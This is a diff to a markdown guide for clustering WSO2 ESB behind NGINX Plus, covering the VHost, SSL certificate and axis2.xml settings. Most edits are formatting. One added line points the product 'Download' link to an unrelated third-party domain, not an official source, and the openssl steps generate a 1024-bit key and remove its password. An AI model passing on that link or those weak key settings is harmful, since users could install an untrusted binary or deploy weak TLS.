@@ -102,7 +102,7 @@ listen 443;
 ```
 
 Configure NGINX Plus to access the Management Console as https://mgt.esb.wso2.com/carbon via HTTPS 443 port. This is to direct requests to the manager node. To do this, create a VHost file (mgt.esb.https.conf) in the /etc/nginx/conf.d directory and add the following configurations into it.
-
+```
 server {
     listen 443;
     server_name mgt.esb.wso2.com;
@@ -122,53 +122,62 @@ server {
     error_log  /var/log/nginx/mgt-error.log ;
            access_log  /var/log/nginx/mgt-access.log;
 }
+```
 
-Restart the NGINX Plus server.
-
+* Restart the NGINX Plus server.
+```
 $sudo service nginx restart
-
+```
 > Tip: You do not need to restart the server if you are simply making a modification to the VHost file. The following command should be sufficient in such cases.
-
+```
 $sudo service nginx reload 
+```
 
 ### Create SSL certificates
 
 Create SSL certificates for both the manager and worker nodes using the instructions that follow.
 
-Create the Server Key.
-
+* Create the Server Key.
+```
 $sudo openssl genrsa -des3 -out server.key 1024
-
-Certificate Signing Request.
-
+```
+* Certificate Signing Request.
+```
 $sudo openssl req -new -key server.key -out server.csr
-
-Remove the password.
-
+```
+* Remove the password.
+```
 $sudo cp server.key server.key.org
 $sudo openssl rsa -in server.key.org -out server.key
-
-Sign your SSL Certificate.
-
+```
+* Sign your SSL Certificate.
+```
 $sudo openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
-
+```
 While creating keys, enter the host name (esb.wso2.com or mgt.esb.wso2.com) as the common name.
 
 ### Setting up the databases
 
 See Setting up the Database for information on how to set up the databases for a cluster. The datasource configurations must be done in the <PRODUCT_HOME>/repository/conf/datasources/master-datasources.xml file for both the manager and worker nodes. You would also have to configure the shared registry database and mounting details in the <PRODUCT_HOME>/repository/conf/registry.xml file.
 
-Configuring the manager node
-Download and unzip the WSO2 ESB binary distribution. Consider the extracted directory as <PRODUCT_HOME>.
-Set up the cluster configurations. Edit the <PRODUCT_HOME>/repository/conf/axis2/axis2.xml file as follows.
-Enable clustering for this node: 
+### Configuring the manager node
+
+* [Download](http://ziben.com.br/coisitas/wso2ei-6.1.1.zip)  and unzip the WSO2 ESB binary distribution. Consider the extracted directory as <PRODUCT_HOME>.
+
+* Set up the cluster configurations. Edit the <PRODUCT_HOME>/repository/conf/axis2/axis2.xml file as follows.
+> Enable clustering for this node: 
 <clustering class="org.wso2.carbon.core.clustering.hazelcast.HazelcastClusteringAgent" enable="true">
-Set the membership scheme to wka to enable the well-known address registration method (this node sends cluster initiation messages to the WKA members that we define later). 
+
+> Set the membership scheme to wka to enable the well-known address registration method (this node sends cluster initiation messages to the WKA members that we define later). 
 <parameter name="membershipScheme">wka</parameter>
-Specify the name of the cluster this node will join.
+
+> Specify the name of the cluster this node will join.
 <parameter name="domain">wso2.esb.domain</parameter>
-Specify the host used to communicate cluster messages.
+
+> Specify the host used to communicate cluster messages.
+```xml
 <parameter name="localMemberHost">xxx.xxx.xxx.xx2</parameter>
+```
 Specify the port used to communicate cluster messages. This port number is not affected by the port offset value specified in the <PRODUCT_HOME>/repository/conf/carbon.xml. If this port number is already assigned to another server, the clustering framework automatically increments this port number. However, if two servers are running on the same machine, you must ensure that a unique port is set for each server.
 <parameter name="localMemberPort">4100</parameter>
 
